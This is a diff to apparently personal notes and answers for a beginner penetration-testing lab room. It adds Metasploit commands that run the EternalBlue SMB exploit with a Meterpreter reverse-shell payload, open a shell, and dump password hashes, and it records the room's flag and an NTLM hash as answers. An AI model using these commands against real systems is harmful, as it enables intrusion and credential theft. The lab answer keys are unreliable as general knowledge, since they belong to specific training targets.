@@ -118,12 +118,13 @@ These are my notes, answers, and writeups for all the rooms in the Complete Begi
 - Exploit one of the critical vulnerabilities on the target VM
   ```
   use exploit/windows/smb/ms17_010_eternalblue
-  set payload generic/shell_reverse_tcp
+  set payload windows/x64/meterpreter/reverse_tcp
   set rhosts <target_ip>
   run
   ```
 - What is the content of the flag.txt file?
   ```
+  shell
   cd ../..
   dir /b/s flag.txt
   type C:\Users\Jon\Documents\flag.txt
@@ -131,7 +132,7 @@ These are my notes, answers, and writeups for all the rooms in the Complete Begi
   > THM-5455554845
 - What is the NTLM hash of the password of the user "pirate"?
   ```
-
+  hashdump
   ```
   > 8ce9a3ebd1647fcc5e04025019f4b875
 
